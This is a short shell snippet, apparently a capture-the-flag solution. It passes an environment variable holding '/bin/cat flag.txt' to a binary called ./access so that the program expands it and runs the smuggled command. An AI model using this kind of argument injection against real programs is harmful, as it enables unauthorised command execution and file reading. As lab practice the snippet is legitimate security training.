$ export a="/bin/cat flag.txt"
$ export b="$a"
$ ./access "$(echo \$b)"
